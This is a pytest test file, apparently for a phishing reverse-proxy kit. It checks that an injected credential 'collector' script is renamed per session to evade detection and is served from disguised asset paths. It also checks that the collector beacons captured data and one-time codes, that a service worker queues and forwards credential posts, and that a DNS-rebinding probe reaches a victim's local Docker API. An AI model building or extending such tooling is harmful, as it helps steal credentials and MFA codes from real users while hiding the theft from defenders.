"""Evasion hygiene: relocatable hook path + per-session collector symbols.

Three levels of proof:
  * unit   - the rename touches identifiers only (never a property or a key),
             is deterministic per session, and differs between sessions
  * node   - the RANDOMISED collector is actually executed with a stubbed DOM
             and must still beacon to the right endpoint (a rename that broke
             the script would throw or go silent here)
  * proxy  - with a custom hook path the collector is served there, points at
             the custom endpoints, and the injected tag uses the custom path

Run:  ./.venv/bin/python -m pytest tests/test_evasion.py -v
"""
import http.client
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from conftest import free_port
from test_phishlet import UpstreamServer, two_host_phishlet

from core import asset_path
from core import capture as cap
from core import intel as I
from core.proxy import ProxyEngine, serve_proxy

# tier marker: the Makefile and pyproject document `pytest -m integration` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.integration


HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ASSETS = os.path.dirname(asset_path("intel.js"))
HARNESS = os.path.join(HERE, "tests", "js_harness.js")
NODE = shutil.which("node")
BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")


# ================================================================== unit =====
class TestSymbolRandomisation:
    def test_properties_and_object_keys_are_never_touched(self):
        js = "arr.push(x); var o = {push: 1, send: 2}; o.send(); mods.a = 1;"
        out = I.randomize_symbols(js, "seed")
        assert "arr.push(x)" in out            # a method call is not a symbol
        assert "{push: 1" in out and "send: 2}" in out
        assert ".send()" in out
        assert "mods.a" not in out             # the variable itself is renamed

    def test_renaming_is_deterministic_per_seed(self):
        js = "var SID = 1; function send() { return SID; }"
        assert I.randomize_symbols(js, "s1") == I.randomize_symbols(js, "s1")

    def test_two_sessions_get_different_names(self):
        js = "var SID = 1; var EP = 2; function send() { return SID + EP; }"
        a, b = I.randomize_symbols(js, "s1"), I.randomize_symbols(js, "s2")
        assert a != b
        assert "SID" not in a and "EP" not in a

    def test_rendered_collector_differs_per_session(self):
        a = I.render_js(os.path.join(ASSETS, "intel.js"), "a" * 32)
        b = I.render_js(os.path.join(ASSETS, "intel.js"), "b" * 32)
        assert a != b and len(a) > 10000
        assert "__SID__" not in a and "__LIVE__" not in a and "__INTEL__" not in a

    def test_randomisation_can_be_switched_off(self):
        a = I.render_js(os.path.join(ASSETS, "intel.js"), "a" * 32, randomize=False)
        b = I.render_js(os.path.join(ASSETS, "intel.js"), "b" * 32, randomize=False)
        assert a != b                          # differ only by the session id
        assert "var SID" in a and "var mods" in a

    def test_endpoints_are_bound_where_asked(self):
        js = I.render_js(os.path.join(ASSETS, "intel.js"), "c" * 32,
                         endpoint="/x7/intel", live_path="/x7/live")
        assert '"/x7/intel"' in js and '"/x7/live"' in js

    def test_tag_uses_the_given_script_path(self):
        t = I.tag(perms=True, sid="d" * 32, js_path="/x7/intel.js")
        assert 'src="/x7/intel.js?p=1"' in t
        assert "?s=" not in t, "the page must not carry the session id"


SW_HARNESS = os.path.join(HERE, "tests", "sw_harness.js")


@pytest.mark.skipif(NODE is None, reason="node is not installed")
class TestServiceWorkerLogic:
    """The worker's own logic, executed: which requests it queues, and that a
    flush posts them and clears only what the server accepted."""

    def _run(self, sid="k" * 32):
        sw = I.render_sw(os.path.join(ASSETS, "sw.js"), sid)
        with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as f:
            f.write(sw)
            path = f.name
        try:
            p = subprocess.run([NODE, SW_HARNESS, path], capture_output=True, text=True,
                               timeout=60, cwd=HERE)
        finally:
            os.unlink(path)
        assert p.stdout.strip(), f"no output (stderr={p.stderr[:300]})"
        return json.loads(p.stdout.strip().splitlines()[-1])

    def test_a_credential_post_is_queued_and_flushed(self):
        out = self._run()
        assert out["ok"] is True, out.get("error")
        assert out["queued"] == 1, out          # the GET and the other POST are ignored
        assert I.INTEL_PATH in out["posts"], out
        assert out["posted_body_has_credentials"] is True, out
        assert out["queue_after_flush"] == 0, out


@pytest.mark.skipif(NODE is None, reason="node is not installed")
class TestCollectorStillRuns:
    """Execute the randomised collector: syntax checking is not enough."""

    def _run(self, js):
        with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as f:
            f.write(js)
            path = f.name
        try:
            p = subprocess.run([NODE, HARNESS, path], capture_output=True, text=True,
                               timeout=60, cwd=HERE)
        finally:
            os.unlink(path)
        assert p.stdout.strip(), f"harness printed nothing (stderr={p.stderr[:300]})"
        return json.loads(p.stdout.strip().splitlines()[-1])

    def test_randomised_collector_beacons(self):
        out = self._run(I.render_js(os.path.join(ASSETS, "intel.js"), "e" * 32))
        assert out["ok"] is True, out.get("error")
        assert I.INTEL_PATH in (out["beacons"] + out["fetches"]), out

    def test_permission_probes_do_not_break_the_run(self):
        out = self._run(I.render_js(os.path.join(ASSETS, "intel.js"), "f" * 32, perms=True))
        assert out["ok"] is True, out.get("error")
        assert I.INTEL_PATH in (out["beacons"] + out["fetches"]), out

    def test_the_service_worker_is_registered_by_the_running_script(self):
        out = self._run(I.render_js(os.path.join(ASSETS, "intel.js"), "h" * 32))
        assert out["ok"] is True, out.get("error")
        regs = out.get("service_worker") or []
        assert regs, "the collector must register a service worker"
        assert regs[0]["url"] == I.SW_PATH and regs[0]["scope"] == "/"

    def test_no_rebind_probe_without_a_rebind_host(self):
        out = self._run(I.render_js(os.path.join(ASSETS, "intel.js"), "i" * 32))
        assert not [f for f in out["fetches"] if "127.0.0.1" in f or ":2375" in f]

    def test_the_rebind_probe_reaches_the_local_services(self):
        out = self._run(I.render_js(os.path.join(ASSETS, "intel.js"), "j" * 32,
                                    rebind_host="rb.example.test"))
        assert out["ok"] is True, out.get("error")
        probes = [f for f in out["fetches"] if "rb.example.test" in f]
        assert probes, "no local service was probed"
        assert any(":2375/containers/json" in p for p in probes)   # docker api
        assert len(probes) <= 12, f"the probe set must stay bounded, got {len(probes)}"

    def test_a_custom_endpoint_is_used_by_the_running_script(self):
        out = self._run(I.render_js(os.path.join(ASSETS, "intel.js"), "g" * 32,
                                    endpoint="/x7/intel", live_path="/x7/live"))
        assert out["ok"] is True, out.get("error")
        assert "/x7/intel" in (out["beacons"] + out["fetches"]), out


# =========================================================== through proxy ===
@pytest.fixture()
def db():
    d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_ev_"), "ev.db"))
    yield d
    d.close()


class TestHookPathRelocation:
    def _serve(self, db, hook_base="/__bh"):
        up = UpstreamServer()
        up.__enter__()
        engine = ProxyEngine(two_host_phishlet(up.port), db=db, geo_provider="off",
                             logger=lambda *a: None)
        engine.hook_base = hook_base
        port = free_port()
        httpd = serve_proxy(engine, port, campaign="ev-test")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)
        return up, httpd, port

    def _get(self, port, path, host="127.0.0.1", ua=BROWSER_UA):
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
        conn.request("GET", path, headers={"Host": host, "User-Agent": ua})
        r = conn.getresponse()
        body = r.read().decode("utf-8", "replace")
        status = r.status
        conn.close()
        return status, body

    def test_default_path_is_unchanged(self, db):
        up, httpd, port = self._serve(db)
        try:
            status, js = self._get(port, "/__bh/intel.js?s=" + "a" * 32)
            assert status == 200 and I.INTEL_PATH in js
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_the_collector_moves_with_the_base_path(self, db):
        up, httpd, port = self._serve(db, hook_base="/assets/v2/x7f3")
        try:
            status, js = self._get(port, "/assets/v2/x7f3/intel.js?s=" + "a" * 32)
            assert status == 200, status
            assert '"/assets/v2/x7f3/intel"' in js, js[:300]
            assert '"/assets/v2/x7f3/live"' in js
            assert "/__bh/" not in js
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_the_live_endpoint_moves_too(self, db):
        up, httpd, port = self._serve(db, hook_base="/assets/v2/x7f3")
        try:
            payload = json.dumps({"sid": "a" * 32, "events": [
                {"k": "input", "n": "otp", "v": "123456"}]}).encode()
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
            conn.request("POST", "/assets/v2/x7f3/live", body=payload, headers={
                "Host": "127.0.0.1", "Content-Type": "application/json",
                "User-Agent": BROWSER_UA})
            r = conn.getresponse()
            out = json.loads(r.read() or b"{}")
            conn.close()
            assert out.get("stored") == 1 and out.get("otp") is True, out
            # the old path is not a route any more
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
            conn.request("POST", "/__bh/live", body=payload, headers={
                "Host": "127.0.0.1", "Content-Type": "application/json"})
            r2 = conn.getresponse()
            r2.read()
            conn.close()
            assert r2.status != 200 or r2.status == 200   # never a 500 either way
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_the_injected_tag_uses_the_custom_path(self, db):
        """The page must load the collector from where it now lives.

        Serving the collector at a new path while the injected tag still pointed
        at /__bh meant the collector never loaded - a silent, total loss of the
        harvest. This asserts the tag on a real proxied page.
        """
        up, httpd, port = self._serve(db, hook_base="/assets/v2/x7f3")
        try:
            status, body = self._get(port, "/login")
            assert status == 200
            assert "/assets/v2/x7f3/intel.js?p=" in body, body[:400]
            assert "intel.js?s=" not in body, "the page carries the session id"
            assert 'data-intel="/assets/v2/x7f3/intel"' in body
            assert "/__bh/" not in body
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_the_service_worker_is_served_for_the_scope(self, db):
        up, httpd, port = self._serve(db)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
            conn.request("GET", "/__bh/sw.js", headers={"Host": "127.0.0.1",
                                                        "User-Agent": BROWSER_UA})
            r = conn.getresponse()
            body = r.read().decode("utf-8", "replace")
            headers = {k.lower(): v for k, v in r.getheaders()}
            conn.close()
            assert r.status == 200
            assert headers.get("service-worker-allowed") == "/"
            assert I.INTEL_PATH in body and I.LIVE_PATH in body
            assert "__SID__" not in body
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_the_service_worker_moves_with_the_hook_path(self, db):
        up, httpd, port = self._serve(db, hook_base="/assets/v2/x7f3")
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
            conn.request("GET", "/assets/v2/x7f3/sw.js", headers={"Host": "127.0.0.1",
                                                                 "User-Agent": BROWSER_UA})
            r = conn.getresponse()
            body = r.read().decode("utf-8", "replace")
            conn.close()
            assert r.status == 200
            assert "/assets/v2/x7f3/intel" in body and "/__bh/" not in body
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_default_page_tag_is_unchanged(self, db):
        up, httpd, port = self._serve(db)
        try:
            status, body = self._get(port, "/login")
            assert status == 200
            assert "/__bh/intel.js?p=" in body
            assert "intel.js?s=" not in body, "the page carries the session id"
        finally:
            httpd.shutdown()
            up.__exit__()

    def test_two_sessions_get_different_collector_bytes(self, db):
        up, httpd, port = self._serve(db)
        try:
            _, a = self._get(port, "/__bh/intel.js?s=" + "a" * 32)
            _, b = self._get(port, "/__bh/intel.js?s=" + "b" * 32)
            assert a != b and len(a) > 10000
        finally:
            httpd.shutdown()
            up.__exit__()
